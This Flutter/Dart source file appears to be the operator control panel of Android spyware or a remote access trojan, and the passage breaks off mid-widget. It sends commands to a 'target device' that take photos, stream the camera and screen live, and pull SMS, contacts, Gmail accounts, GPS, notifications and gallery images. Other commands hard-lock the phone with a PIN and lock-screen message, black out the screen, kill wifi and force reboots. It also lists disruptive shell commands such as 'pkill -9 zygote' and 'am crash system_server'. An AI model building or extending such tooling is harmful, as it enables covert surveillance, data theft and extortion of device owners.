import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'config.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';

// ─────────────────────────────────────────────────────────────────────────────
// CONTROL CENTER — Tab Dashboard (SxC V12 PREMIUM EDITION)
// ─────────────────────────────────────────────────────────────────────────────
class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'developer'});
  @override State<ControlCenterPage> createState() => _State();
}

class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixin {

  // ── SxC V12 PREMIUM COLORS ────────────────────────────────────────────────
  static const _kBg    = Color(0xFF0A0A1A);
  static const _kCard  = Color(0xFF12122E);
  static const _kBord  = Color(0xFF1F1F4A);
  static const _kText  = Color(0xFFF0F0FF);
  static const _kSub   = Color(0xFF6B7280);
  
  // SxC V12 Premium Neon Palette
  static const _kRed     = Color(0xFFFF2D75);
  static const _kBlue    = Color(0xFF00D4FF);
  static const _kGreen   = Color(0xFF00FF88);
  static const _kOrng    = Color(0xFFFF6B35);
  static const _kPurp    = Color(0xFFD946EF);
  static const _kCyan    = Color(0xFF00E5FF);
  static const _kGold    = Color(0xFFFFD700);
  static const _kPink    = Color(0xFFFF4081);

  static const Set<String> _needPoll = {
    'take_photo','get_screen','get_location','track_gps',
    'get_contacts','dump_contacts','get_gmails','get_sms','get_gallery',
  };

  // ── State ──────────────────────────────────────────────────────────────────
  late TabController _tabs;
  bool _sending = false;
  final List<String> _log = [];

  // Live
  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  // Chat
  final List<Map<String,String>> _chat = [];
  final _chatCtrl   = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  // ── Animations ────────────────────────────────────────────────────────────
  late AnimationController _fadeController;
  late Animation<double> _fadeAnimation;
  late AnimationController _pulseController;
  late Animation<double> _pulseAnimation;

  // ── Device info ────────────────────────────────────────────────────────────
  String get _id      => widget.targetDevice?['id']?.toString()      ?? 'unknown';
  String get _model   => widget.targetDevice?['model']?.toString()   ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 6, vsync: this);
    
    // Premium Animations
    _fadeController = AnimationController(
      duration: const Duration(milliseconds: 600),
      vsync: this,
    );
    _fadeAnimation = CurvedAnimation(
      parent: _fadeController,
      curve: Curves.easeInOut,
    );
    _fadeController.forward();
    
    _pulseController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    );
    _pulseAnimation = Tween<double>(begin: 1.0, end: 1.02).animate(
      CurvedAnimation(
        parent: _pulseController,
        curve: Curves.easeInOut,
      ),
    );
    _pulseController.repeat(reverse: true);
    
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _cmd('force_open', silent: true);
    });
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _tabs.dispose();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _frameN.dispose();
    _fadeController.dispose();
    _pulseController.dispose();
    super.dispose();
  }

  // ── Log ────────────────────────────────────────────────────────────────────
  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11,19)}]  $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = _kRed}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: c.withOpacity(0.9),
      content: Text(m, style: const TextStyle(fontWeight: FontWeight.w600, fontSize: 13)),
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
    ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // SEND COMMAND
  // ─────────────────────────────────────────────────────────────────────────
  Future<void> _cmd(String cmd, {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') { if (!silent) _toast('ID target tidak valid'); return; }
    if (!silent) setState(() => _sending = true);
    try {
      final res = await http.post(
        Uri.parse('${ApiConfig.baseUrl}/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));

      if (res.statusCode == 200) {
        if (!silent) {
          _addLog('Sent: $cmd');
          _toast('Command sent', c: _kGreen);
        }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else {
        if (!silent) { _addLog('Error $cmd (${res.statusCode})'); _toast('Target offline'); }
      }
    } catch (e) {
      if (!silent) { _addLog('Conn error: $e'); _toast('Connection failed'); }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // POLL RESPONSE
  // ─────────────────────────────────────────────────────────────────────────
  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' ? 60 : 30;
    int n = 0; bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      _addLog('Polling $cmd ($n/$max)');
      try {
        final res = await http.get(Uri.parse('${ApiConfig.baseUrl}/api/get-response/$_id'))
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200 && res.body.isNotEmpty && res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) { _onResponse(cmd, d['data']); got = true; }
          }
        }
      } catch (_) {}
    }
    if (!got && mounted) _addLog('Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    switch (cmd) {
      case 'take_photo':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) { _toast('No photo'); return; }
        _addLog('Photo received');
        _imgDialog(b, 'Target Photo');
        break;
      case 'get_screen':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) return;
        _addLog('Screenshot received');
        _imgDialog(b, 'Screenshot');
        break;
      case 'get_location': case 'track_gps':
        _addLog('GPS received');
        _locationDialog(d['lat'], d['lng']);
        break;
      case 'get_contacts': case 'dump_contacts':
        final l = d['contacts'] as List? ?? [];
        _addLog('${l.length} contacts');
        _contactsSheet(l);
        break;
      case 'get_gmails':
        _addLog('Accounts received');
        _textDialog('Accounts & Emails', d['accounts']?.toString() ?? '-');
        break;
      case 'get_sms':
        final s = d['sms'] as List? ?? [];
        _addLog('${s.length} SMS');
        _smsSheet(s);
        break;
      case 'get_gallery':
        final imgs = d['images'] as List? ?? [];
        _addLog('${imgs.length} gallery photos');
        _gallerySheet(imgs);
        break;
      default:
        _addLog('$cmd completed');
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // LIVE STREAM
  // ─────────────────────────────────────────────────────────────────────────
  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true; _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? 'FRONT CAMERA' : 'BACK CAMERA')
          : 'SCREEN STREAM';
      _frmCount = 0; _fps = 0; _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) { _liveTimer?.cancel(); return; }
      try {
        final res = await http.get(Uri.parse('${ApiConfig.baseUrl}/api/live-frame/$_id'))
            .timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200) {
          final raw = (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes; _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) { _fps = (_frmCount * 1000 / ms).round(); _frmCount = 0; _fpsTs = DateTime.now(); }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) setState(() { _liveOn = false; _frame = null; });
    _cmd('live_stop', silent: true);
    _addLog('Live stopped');
  }

  // ─────────────────────────────────────────────────────────────────────────
  // CHAT
  // ─────────────────────────────────────────────────────────────────────────
  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http.get(Uri.parse('${ApiConfig.baseUrl}/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({'from': m['from']?.toString() ?? '','text': m['text']?.toString() ??'','time': m['time']?.toString() ??''});
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({'from': 'developer', 'text': text.trim(), 'time': TimeOfDay.now().format(context)}));
    _scrollChat();
    try {
      await http.post(Uri.parse('${ApiConfig.baseUrl}/api/lock-chat/$_id'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'developer'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
    });
  }

  // ─────────────────────────────────────────────────────────────────────────
  // BUILD
  // ─────────────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return FadeTransition(
      opacity: _fadeAnimation,
      child: Scaffold(
        backgroundColor: _kBg,
        appBar: AppBar(
          backgroundColor: Colors.transparent,
          elevation: 0,
          leading: Container(
            margin: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: _kBord, width: 1),
            ),
            child: IconButton(
              icon: const Icon(Icons.arrow_back_ios_new, color: _kText, size: 18),
              onPressed: () { if (_liveOn) _stopLive(); Navigator.pop(context); }
            ),
          ),
          title: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text(_model, style: const TextStyle(color: _kText, fontSize: 16, fontWeight: FontWeight.w700, letterSpacing: 0.5)),
            const SizedBox(height: 2),
            Row(children: [
              AnimatedContainer(
                duration: const Duration(milliseconds: 500),
                width: 8,
                height: 8,
                decoration: BoxDecoration(
                  color: _liveOn ? _kRed : (_sending ? _kGold : _kGreen),
                  shape: BoxShape.circle,
                  boxShadow: [BoxShadow(color: (_liveOn ? _kRed : _kGreen).withOpacity(0.5), blurRadius: 6)],
                ),
              ),
              const SizedBox(width: 6),
              Text('Battery: $_battery%  •  $_id',
                  style: const TextStyle(color: _kSub, fontSize: 9), overflow: TextOverflow.ellipsis),
            ]),
          ]),
          actions: [
            if (_liveOn) Container(
              margin: const EdgeInsets.symmetric(vertical: 12, horizontal: 4),
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
              decoration: BoxDecoration(
                color: _kRed.withOpacity(0.15),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: _kRed.withOpacity(0.5)),
              ),
              child: Row(mainAxisSize: MainAxisSize.min, children: [
                AnimatedBuilder(
                  animation: _pulseAnimation,
                  builder: (context, child) {
                    return Transform.scale(
                      scale: _pulseAnimation.value,
                      child: Container(width: 6, height: 6, decoration: const BoxDecoration(color: _kRed, shape: BoxShape.circle)),
                    );
                  },
                ),
                const SizedBox(width: 6),
                Text('$_fps fps', style: const TextStyle(color: _kRed, fontSize: 11, fontWeight: FontWeight.bold)),
              ]),
            ),
            if (_sending) const Padding(padding: EdgeInsets.only(right: 12),
              child: Center(child: SizedBox(width: 16, height: 16,
                  child: CircularProgressIndicator(strokeWidth: 2, color: _kRed)))),
            Container(
              margin: const EdgeInsets.only(right: 8),
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: _kBord, width: 1),
              ),
              child: IconButton(
                icon: const Icon(Icons.refresh_rounded, color: _kSub, size: 18),
                onPressed: () { setState(() {}); _cmd('force_open', silent: true); }
              ),
            ),
          ],
          bottom: PreferredSize(
            preferredSize: const Size.fromHeight(48),
            child: Container(
              margin: const EdgeInsets.symmetric(horizontal: 12),
              child: TabBar(
                controller: _tabs,
                isScrollable: true,
                indicator: const UnderlineTabIndicator(
                  borderSide: BorderSide(color: _kBlue, width: 2.5),
                  insets: EdgeInsets.symmetric(horizontal: 8),
                ),
                labelColor: _kBlue,
                unselectedLabelColor: _kSub,
                labelStyle: const TextStyle(fontSize: 11, fontWeight: FontWeight.w700, letterSpacing: 0.5),
                unselectedLabelStyle: const TextStyle(fontSize: 11, fontWeight: FontWeight.w500),
                tabs: const [
                  Tab(text: 'Live Stream'),
                  Tab(text: 'Camera'),
                  Tab(text: 'Intel'),
                  Tab(text: 'Audio'),
                  Tab(text: 'Lock blanks'),
                  Tab(text: 'Device'),
                ],
              ),
            ),
          ),
        ),
        body: Column(children: [
          // Log Panel
          Container(
            height: 52,
            margin: const EdgeInsets.fromLTRB(12, 8, 12, 0),
            padding: const EdgeInsets.fromLTRB(12, 6, 12, 6),
            decoration: BoxDecoration(
              color: _kCard,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: _kBord, width: 0.5),
              boxShadow: [BoxShadow(color: _kBord.withOpacity(0.2), blurRadius: 8)],
            ),
            child: _log.isEmpty
                ? const Center(child: Text('Ready for commands', style: TextStyle(color: _kSub, fontSize: 10, letterSpacing: 0.5)))
                : ListView.builder(
                    itemCount: _log.length,
                    itemBuilder: (_, i) => Text(
                      _log[i],
                      style: const TextStyle(color: _kCyan, fontSize: 9, fontFamily: 'monospace'),
                      maxLines: 1,
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
          ),
          Expanded(child: TabBarView(controller: _tabs, children: [
            _pageLive(),
            _pageCamera(),
            _pageIntel(),
            _pageAudio(),
            _pageLock(),
            _pageDevice(),
          ])),
        ]),
      ),
    );
  }

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: LIVE STREAM (PREMIUM)
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageLive() => ListView(padding: const EdgeInsets.all(16), children: [
    _header('LIVE STREAM', 'Real-time camera & screen from target device'),
    const SizedBox(height: 16),
    AnimatedContainer(
      duration: const Duration(milliseconds: 300),
      height: _liveOn ? 240 : 100,
      decoration: BoxDecoration(
        color: const Color(0xFF020210),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _liveOn ? _kRed.withOpacity(0.6) : _kBord, width: 1.5),
        boxShadow: _liveOn ? [BoxShadow(color: _kRed.withOpacity(0.2), blurRadius: 20)] : [],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(19),
        child: _liveOn && _frame != null
            ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true, filterQuality: FilterQuality.low)
            : Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(Icons.videocam_off_rounded, color: _kSub, size: 32),
                    const SizedBox(height: 8),
                    Text(_liveOn ? 'Waiting for frames...' : 'Stream inactive',
                        style: const TextStyle(color: _kSub, fontSize: 11)),
                  ],
                ),
              ),
      ),
    ),
    const SizedBox(height: 20),
    _neonDualBtn(
      leftLabel: 'CAMERA',
      leftIcon: Icons.videocam_rounded,
      leftColor: _kRed,
      leftFn: () { _showCamPicker((side) { _startLive('live_camera_start', side); _showLiveDialog(); }); },
      rightLabel: 'SCREEN',
      rightIcon: Icons.desktop_windows_rounded,
      rightColor: _kBlue,
      rightFn: () { _startLive('live_screen_start', ''); _showLiveDialog(); },
    ),
    if (_liveOn) ...[
      const SizedBox(height: 12),
      _neonSingleBtn('STOP LIVE', Icons.stop_circle_outlined, _kRed, _stopLive, isDestructive: true),
    ],
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: CAMERA (PREMIUM)
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageCamera() => ListView(padding: const EdgeInsets.all(16), children: [
    _header('CAMERA & VISUAL', 'Capture photos, screenshots, and control display'),
    const SizedBox(height: 16),
    _neonSingleBtn('TAKE PHOTO', Icons.camera_alt_rounded, _kRed, () {
      _showCamPicker((s) => _cmd('take_photo', extra: s));
    }),
    _gap,
    _neonSingleBtn('SCREENSHOT', Icons.screenshot_monitor, _kBlue, () => _cmd('get_screen')),
    _gap,
    _neonSingleBtn('SET WALLPAPER', Icons.wallpaper_rounded, _kPurp, () {
      _inputDialog('Set Wallpaper', 'Image URL', (v) => _cmd('set_wallpaper', extra: v));
    }),
    _gap,
    _neonDualBtn(
      leftLabel: 'STROBE ON',
      leftIcon: Icons.flash_on_rounded,
      leftColor: _kOrng,
      leftFn: () => _cmd('flash_strobe'),
      rightLabel: 'STROBE OFF',
      rightIcon: Icons.flash_off_rounded,
      rightColor: _kSub,
      rightFn: () => _cmd('stop_strobe'),
    ),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: INTELLIGENCE (PREMIUM)
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageIntel() => ListView(padding: const EdgeInsets.all(16), children: [
    _header('INTELLIGENCE', 'Extract data and information from target device'),
    const SizedBox(height: 16),
    _neonSingleBtn('CONTACTS', Icons.contacts_rounded, _kRed, () => _cmd('get_contacts')),
    _gap,
    _neonSingleBtn('GPS LOCATION', Icons.my_location_rounded, _kGreen, () => _cmd('get_location')),
    _gap,
    _neonSingleBtn('GMAIL & ACCOUNTS', Icons.account_circle_rounded, _kBlue, () => _cmd('get_gmails')),
    _gap,
    _neonSingleBtn('SMS INBOX', Icons.sms_rounded, _kCyan, () => _cmd('get_sms')),
    _gap,
    _neonSingleBtn('NOTIFICATIONS', Icons.notifications_rounded, _kPurp, () => _fetchNotif()),
    _gap,
    _neonSingleBtn('GALLERY (5 PHOTOS)', Icons.photo_library_rounded, _kGold, () => _cmd('get_gallery', extra: '5')),
    _gap,
    _neonSingleBtn('REQUEST NOTIF ACCESS', Icons.security_rounded, _kSub, () => _cmd('open_notification_settings')),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: AUDIO (PREMIUM)
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageAudio() => ListView(padding: const EdgeInsets.all(16), children: [
    _header('AUDIO & NETWORK', 'Control audio and network on target device'),
    const SizedBox(height: 16),
    _neonSingleBtn('PLAY AUDIO', Icons.play_circle_rounded, _kOrng, () {
      _inputDialog('Play Audio', 'MP3 URL', (v) => _cmd('play_audio', extra: v));
    }),
    _gap,
    _neonSingleBtn('STOP AUDIO', Icons.stop_circle_rounded, _kSub, () => _cmd('stop_audio')),
    _gap,
    _neonSingleBtn('VIBRATE LOOP', Icons.vibration_rounded, _kPurp, () => _cmd('vibrate_loop')),
    _gap,
    _neonSingleBtn('OPEN URL', Icons.open_in_browser, _kBlue, () {
      _inputDialog('Open URL', 'https://...', (v) => _cmd('open_url', extra: v));
    }),
    _gap,
    _neonSingleBtn('KILL WIFI', Icons.wifi_off_rounded, _kCyan, () => _cmd('kill_wifi')),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: LOCK & CHAT (PREMIUM)
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageLock() => Column(children: [
    Expanded(child: ListView(padding: const EdgeInsets.all(16), children: [
      _header('REMOTE BLANK', ' make the target screen black freeze'),
      const SizedBox(height: 16),

      _neonSingleBtn('LOCK BLANK SCREEN', Icons.lock_rounded, _kRed, () => _lockLiveDialog(), isDestructive: true),
      _gap,
      _neonSingleBtn('BLACK SCREEN', Icons.lock_outline_rounded, _kBlue, () => _lockChatDialog()),
      _gap,
      _neonSingleBtn('HARD LOCK DEVICE', Icons.lock_clock_rounded, _kOrng, () {
        _inputDialog('Lock Device', 'Message on lock screen', (msg) {
          _inputDialog('PIN Unlock', '4-digit PIN', (pin) {
            _cmd('hard_lock', extra: '$msg|$pin');
          }, isNumber: true, hint: '1234');
        });
      }),
      _gap,
      _neonSingleBtn('UNLOCK DEVICE', Icons.lock_open_rounded, _kGreen, () => _cmd('unlock')),
      const SizedBox(height: 24),

      _header('CHAT WITH TARGET', 'Messages appear on target\'s lock screen "useless" '),
      const SizedBox(height: 12),
      Container(
        height: 220,
        decoration: BoxDecoration(
          color: _kCard,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: _kBord, width: 0.5),
        ),
        child: _chat.isEmpty
            ? const Center(child: Text('No messages yet', style: TextStyle(color: _kSub, fontSize: 12)))
            : ListView.builder(
                controller: _chatScroll,
                padding: const EdgeInsets.all(12),
                itemCount: _chat.length,
                itemBuilder: (_, i) {
                  final m = _chat[i];
                  final isOwner = m['from'] == 'developer';
                  return TweenAnimationBuilder(
                    tween: Tween<double>(begin: 0.5, end: 1),
                    duration: Duration(milliseconds: 200 + (i * 20)),
                    curve: Curves.easeOutBack,
                    builder: (context, scale, child) {
                      return Transform.scale(scale: scale, child: child);
                    },
                    child: Align(
                      alignment: isOwner ? Alignment.centerRight : Alignment.centerLeft,
                      child: Container(
                        margin: const EdgeInsets.symmetric(vertical: 3),
                        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                        constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.7),
                        decoration: BoxDecoration(
                          gradient: LinearGradient(
                            colors: isOwner 
                                ? [_kRed.withOpacity(0.8), _kBlue.withOpacity(0.6)] 
                                : [_kCard, _kCard.withOpacity(0.8)],
                            begin: Alignment.topLeft,
                            end: Alignment.bottomRight
                          ),
                          borderRadius: BorderRadius.circular(16),
                          border: Border.all(color: isOwner ? _kBlue.withOpacity(0.4) : _kBord, width: 0.5),
                          boxShadow: isOwner ? [BoxShadow(color: _kBlue.withOpacity(0.2), blurRadius: 8)] : [],
                        ),
                        child: Column(crossAxisAlignment: isOwner ? CrossAxisAlignment.end : CrossAxisAlignment.start, children: [
                          Text(m['text'] ?? '', style: const TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w500)),
                          const SizedBox(height: 4),
                          Text(m['time'] ?? '', style: const TextStyle(color: Colors.white38, fontSize: 9)),
                        ]),
                      ),
                    ),
                  );
                },
              ),
      ),
    ])),
    Container(
      padding: const EdgeInsets.fromLTRB(14, 10, 14, 14),
      decoration: BoxDecoration(
        color: _kCard,
        border: Border(top: BorderSide(color: _kBord, width: 1)),
      ),
      child: Row(children: [
        Expanded(child: TextField(
          controller: _chatCtrl,
          style: const TextStyle(color: _kText, fontSize: 14),
          decoration: InputDecoration(
            hintText: 'Type message to target...',
            hintStyle: const TextStyle(color: _kSub, fontSize: 12),
            filled: true,
            fillColor: _kBg,
            contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(28),
              borderSide: BorderSide.none,
            ),
            focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(28),
              borderSide: BorderSide(color: _kBlue, width: 1.5),
            ),
          ),
          onSubmitted: _sendChat,
        )),
        const SizedBox(width: 10),
        AnimatedBuilder(
          animation: _pulseAnimation,
          builder: (context, child) {
            return Transform.scale(
              scale: _pulseAnimation.value,
              child: GestureDetector(
                onTap: () => _sendChat(_chatCtrl.text),
                child: Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    gradient: const LinearGradient(colors: [_kRed, _kBlue], begin: Alignment.topLeft, end: Alignment.bottomRight),
                    shape: BoxShape.circle,
                    boxShadow: [
                      BoxShadow(color: _kBlue.withOpacity(0.4), blurRadius: 12),
                      BoxShadow(color: _kRed.withOpacity(0.4), blurRadius: 12),
                    ],
                  ),
                  child: const Icon(Icons.send_rounded, color: Colors.white, size: 18),
                ),
              ),
            );
          },
        ),
      ]),
    ),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: DEVICE (PREMIUM)
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageDevice() => ListView(padding: const EdgeInsets.all(16), children: [
    _header('DEVICE CONTROL', 'Full system control over target device'),
    const SizedBox(height: 16),
    _neonSingleBtn('RESTART DEVICE', Icons.restart_alt_rounded, _kOrng, () {
      showDialog(context: context, builder: (_) => AlertDialog(
        backgroundColor: _kCard,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: _kOrng.withOpacity(0.5))),
        title: const Text('Restart Device', style: TextStyle(color: _kText, fontSize: 15, fontWeight: FontWeight.bold)),
        content: const Text(
          'The target device will restart.\n\nUsing PowerManager reflection — no root or device admin required.',
          style: TextStyle(color: _kSub, fontSize: 13, height: 1.5)),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text('Cancel', style: TextStyle(color: _kSub))),
          Container(
            decoration: BoxDecoration(
              gradient: const LinearGradient(colors: [_kOrng, Color(0xFFE65100)]),
              borderRadius: BorderRadius.circular(10),
            ),
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
              onPressed: () { Navigator.pop(context); _cmd('reboot_device'); },
              child: const Text('RESTART', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
            ),
          ),
        ],
      ));
    }),
    _gap,
    _neonSingleBtn('WAKE UP TARGET', Icons.wb_sunny_rounded, _kGreen, () => _cmd('force_open')),
    const SizedBox(height: 24),
    Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        gradient: LinearGradient(colors: [_kCard, _kCard.withOpacity(0.5)], begin: Alignment.topLeft, end: Alignment.bottomRight),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _kBord, width: 0.5),
      ),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        const Text('RESTART METHODS', style: TextStyle(color: _kText, fontSize: 12, fontWeight: FontWeight.w700, letterSpacing: 1)),
        const SizedBox(height: 12),
        _infoRow('1', 'PowerManager reflection (no root required)', _kOrng),
        _infoRow('2', 'DevicePolicyManager (if admin active)', _kBlue),
        _infoRow('3', 'su -c reboot (root)', _kRed),
        _infoRow('4', 'am crash system_server', _kPurp),
        _infoRow('5', 'pkill -9 zygote', _kSub),
      ]),
    ),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // DIALOGS
  // ─────────────────────────────────────────────────────────────────────────
  void _showLiveDialog() {
    showDialog(
      context: context, barrierDismissible: false,
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameN,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: _kBg,
          insetPadding: const EdgeInsets.all(8),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: _kRed.withOpacity(0.6), width: 2),
          ),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [_kCard, _kCard.withOpacity(0.8)]),
                borderRadius: const BorderRadius.vertical(top: Radius.circular(18)),
                border: const Border(bottom: BorderSide(color: _kBord)),
              ),
              child: Row(children: [
                AnimatedBuilder(
                  animation: _pulseAnimation,
                  builder: (context, child) {
                    return Transform.scale(
                      scale: _pulseAnimation.value,
                      child: Container(
                        width: 10,
                        height: 10,
                        decoration: BoxDecoration(
                          color: _kRed,
                          shape: BoxShape.circle,
                          boxShadow: [BoxShadow(color: _kRed, blurRadius: 10)],
                        ),
                      ),
                    );
                  },
                ),
                const SizedBox(width: 12),
                Text('LIVE — $_liveTitle', style: const TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.bold, letterSpacing: 0.5)),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                  decoration: BoxDecoration(
                    color: _kGreen.withOpacity(0.15),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: _kGreen.withOpacity(0.4)),
                  ),
                  child: Text('$_fps fps', style: const TextStyle(color: _kGreen, fontSize: 10, fontWeight: FontWeight.bold)),
                ),
              ]),
            ),
            Container(
              constraints: BoxConstraints(maxHeight: MediaQuery.of(context).size.height * 0.55),
              color: const Color(0xFF020210),
              child: _frame != null
                  ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true, filterQuality: FilterQuality.low)
                  : const SizedBox(height: 200, child: Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
                      SizedBox(
                        width: 30,
                        height: 30,
                        child: CircularProgressIndicator(strokeWidth: 2, color: _kBlue),
                      ),
                      SizedBox(height: 12),
                      Text('Waiting for frames...', style: TextStyle(color: _kSub, fontSize: 12)),
                    ]))),
            ),
            Container(
              padding: const EdgeInsets.all(14),
              decoration: const BoxDecoration(
                color: _kCard,
                borderRadius: BorderRadius.vertical(bottom: Radius.circular(18)),
              ),
              child: Row(children: [
                Expanded(
                  child: OutlinedButton.icon(
                    style: OutlinedButton.styleFrom(
                      side: const BorderSide(color: _kBlue),
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                    ),
                    icon: const Icon(Icons.cameraswitch_rounded, color: _kBlue, size: 18),
                    label: const Text('SWITCH', style: TextStyle(color: _kBlue, fontSize: 11, fontWeight: FontWeight.w600)),
                    onPressed: () {
                      final isFront = _liveTitle.contains('FRONT');
                      _stopLive();
                      Future.delayed(const Duration(milliseconds: 300), () => _startLive('live_camera_start', isFront ? 'back' : 'front'));
                    },
                  ),
                ),
                const SizedBox(width: 12),
                Expanded(
